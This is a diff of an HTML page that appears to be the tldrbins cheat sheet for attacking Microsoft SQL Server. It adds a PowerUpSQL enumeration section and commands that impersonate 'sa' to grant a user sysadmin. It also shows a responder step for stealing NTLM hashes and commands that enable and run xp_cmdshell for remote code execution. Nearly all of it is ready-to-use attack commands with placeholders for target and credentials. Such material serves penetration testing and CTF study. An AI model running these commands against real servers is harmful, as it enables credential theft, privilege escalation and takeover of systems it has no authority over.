@@ -184,6 +184,8 @@
   
   <li><a href="https://tldrbins.github.io/@rce/">RCE</a></li>
   
+  <li><a href="https://tldrbins.github.io/@enum/">Enum</a></li>
+  
 </ul>
 <hr>
 <div class="content">
@@ -328,11 +330,19 @@ body.dark-mode #dynamicFormContainer button:hover {
     background: #424242;
 }
 </style>
-  <h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
+  <h3 id="enum">Enum</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import Module
+</span></span><span class="line"><span class="cl"><span class="go">. .\PowerUpSQL.ps1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Audit
+</span></span><span class="line"><span class="cl"><span class="go">Invoke-SQLAudit -Instance &lt;TARGET&gt; -Username &#39;&lt;USER&gt;&#39; -Password &#39;&lt;PASSWORD&gt;&#39; -Verbose
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Execute Query
+</span></span><span class="line"><span class="cl"><span class="go">Get-SQLQuery -Instance &lt;TARGET&gt; -Username &#39;&lt;USER&gt;&#39; -Password &#39;&lt;PASSWORD&gt;&#39; -Query &#34;&lt;QUERY&gt;&#34; -Verbose
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1">PowerUpSQL.ps1</a></em></small></p>
+<h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
 </span></span><span class="line"><span class="cl"><span class="go">sudo responder -I tun0
 </span></span></span></code></pre></div><p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Method 1</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Method 1</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >Method 2</button>
 
@@ -356,7 +366,11 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> RCE
 </span></span><span class="line"><span class="cl"><span class="go">xp_cmdshell whoami
 </span></span></span></code></pre></div><h3 id="abuse-3-impersonate-sa-to-run-xp_cmdshell">Abuse #3: Impersonate sa to run xp_cmdshell</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_configure &#39;show advanced options&#39;, 1;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add user to sysadmin
+</span></span><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_addsrvrolemember &#39;&lt;USER&gt;&#39;,&#39;sysadmin&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">SELECT is_srvrolemember(&#39;sysadmin&#39;);
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_configure &#39;show advanced options&#39;, 1;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; reconfigure;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_configure &#39;xp_cmdshell&#39;, 1;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; reconfigure;
